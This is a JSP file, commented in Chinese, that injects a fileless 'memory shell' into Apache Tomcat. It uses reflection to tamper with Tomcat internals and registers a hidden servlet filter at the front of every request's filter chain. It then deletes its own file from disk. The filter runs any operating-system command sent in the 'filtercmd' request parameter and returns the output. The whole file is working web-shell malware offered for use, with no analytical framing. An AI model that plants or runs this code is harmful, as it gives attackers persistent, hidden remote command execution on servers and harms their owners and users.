<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%@page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<%@page import="com.sun.org.apache.xalan.internal.xsltc.DOM"%>
<%@page import="com.sun.org.apache.xalan.internal.xsltc.TransletException"%>
<%@page import="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"%>
<%@page import="com.sun.org.apache.xml.internal.dtm.DTMAxisIterator"%>
<%@page import="com.sun.org.apache.xml.internal.serializer.SerializationHandler"%>
<%@page import="java.io.File"%>
<%@page import="java.io.IOException"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="javax.servlet.Filter"%>
<%@page import="javax.servlet.FilterChain"%>
<%@page import="javax.servlet.FilterConfig"%>
<%@page import="javax.servlet.ServletContext" %>
<%@page import="javax.servlet.ServletException"%>

<%@page import="javax.servlet.ServletRequest" %>
<%@page import="javax.servlet.ServletResponse" %>

<%!
    /**
    * webshell命令参数名
    */
    private final String cmdParamName = "filtercmd";
    /**
    * 建议针对相应业务去修改filter过滤的url pattern
    */
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "testfilter";

    public class TomcatEchoInject  extends AbstractTranslet {

        public void init(){
          try {
            //修改 WRAP_SAME_OBJECT 值为 true
            Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (!f.getBoolean(null)) {
              f.setBoolean(null, true);
            }
      
            //初始化 lastServicedRequest
            c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            f = c.getDeclaredField("lastServicedRequest");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
              f.set(null, new ThreadLocal());
            }
      
            //初始化 lastServicedResponse
            f = c.getDeclaredField("lastServicedResponse");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
              f.set(null, new ThreadLocal());
            }
          } catch (Exception e) {
            e.printStackTrace();
          }
        }
      
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
      
        }
      
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
      
        }
      }
      
      
      public class TomcatShellInject extends AbstractTranslet implements Filter {

        public Boolean init(String filename) {
            try {
                javax.servlet.ServletContext servletContext = getServletContext();
                if (servletContext != null) {
                    Class c = Class.forName("org.apache.catalina.core.StandardContext");
                    Object standardContext = null;
                    //判断是否已有该名字的filter，有则不再添加
                    if (servletContext.getFilterRegistration(filterName) == null) {
                        //遍历出标准上下文对象
                        for (; standardContext == null; ) {
                            java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
                            contextField.setAccessible(true);
                            Object o = contextField.get(servletContext);
                            if (o instanceof javax.servlet.ServletContext) {
                                servletContext = (javax.servlet.ServletContext) o;
                            } else if (c.isAssignableFrom(o.getClass())) {
                                standardContext = o;
                            }
                        }
                        if (standardContext != null) {
                            //修改状态，要不然添加不了
                            java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
                                .getDeclaredField("state");
                            stateField.setAccessible(true);
                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                            //创建一个自定义的Filter马
                            Filter mainfilter = new TomcatShellInject();
                            //添加filter马
                            javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                                .addFilter(filterName, mainfilter);
                            filterRegistration.setInitParameter("encoding", "utf-8");
                            filterRegistration.setAsyncSupported(false);
                            filterRegistration
                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                    new String[]{"/*"});
                            //状态恢复，要不然服务不可用
                            if (stateField != null) {
                                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                            }
    
                            if (standardContext != null) {
                                //生效filter
                                Method filterStartMethod = org.apache.catalina.core.StandardContext.class
                                    .getMethod("filterStart");
                                filterStartMethod.setAccessible(true);
                                filterStartMethod.invoke(standardContext, null);
    
                                Class ccc = null;
                                try {
                                    ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                                } catch (Throwable t){}
                                if (ccc == null) {
                                    try {
                                        ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                                    } catch (Throwable t){}
                                }
                                //把filter插到第一位
                                Method m = c.getMethod("findFilterMaps");
                                Object[] filterMaps = (Object[]) m.invoke(standardContext);
                                Object[] tmpFilterMaps = new Object[filterMaps.length];
                                int index = 1;
                                for (int i = 0; i < filterMaps.length; i++) {
                                    Object o = filterMaps[i];
                                    m = ccc.getMethod("getFilterName");
                                    String name = (String) m.invoke(o);
                                    if (name.equalsIgnoreCase(filterName)) {
                                        tmpFilterMaps[0] = o;
                                    } else {
                                        tmpFilterMaps[index++] = filterMaps[i];
                                    }
                                }
                                for (int i = 0; i < filterMaps.length; i++) {
                                    filterMaps[i] = tmpFilterMaps[i];
                                }
                            }
                        }                                    
                    }
                    //删除文件
                    new File(servletContext.getRealPath(filename)).delete();  
                    return true;
                }
                else{
                    return false;
                }
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }

    
        private ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            ServletRequest servletRequest = null;
            /*shell注入，前提需要能拿到request、response等*/
            Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
            f.setAccessible(true);
            ThreadLocal threadLocal = (ThreadLocal) f.get(null);
            //不为空则意味着第一次反序列化的准备工作已成功
            if (threadLocal != null && threadLocal.get() != null) {
                servletRequest = (ServletRequest) threadLocal.get();
            }
            //如果不能获取到request，则换一种方式尝试获取
    
            //spring获取法1
            if (servletRequest == null) {
                try {
                    c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                    Method m = c.getMethod("getRequestAttributes");
                    Object o = m.invoke(null);
                    c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                    m = c.getMethod("getRequest");
                    servletRequest = (ServletRequest) m.invoke(o);
                } catch (Throwable t) {}
            }
            if (servletRequest != null)
                return servletRequest.getServletContext();
    
            //spring获取法2
            try {
                c = Class.forName("org.springframework.web.context.ContextLoader");
                Method m = c.getMethod("getCurrentWebApplicationContext");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.WebApplicationContext");
                m = c.getMethod("getServletContext");
                ServletContext servletContext = (ServletContext) m.invoke(o);
                return servletContext;
            } catch (Throwable t) {}
            return null;
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    
        }
    
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
    
        }
    
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
            FilterChain filterChain) throws IOException, ServletException {
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
    
        @Override
        public void destroy() {
    
        }
    } 
      

%>



<%
    TomcatEchoInject te = new TomcatEchoInject();
    te.init();
    TomcatShellInject ts = new TomcatShellInject();
    if(ts.init(request.getServletPath())){
        out.println("success");
    }
    else{
        out.println("again");
    }

%>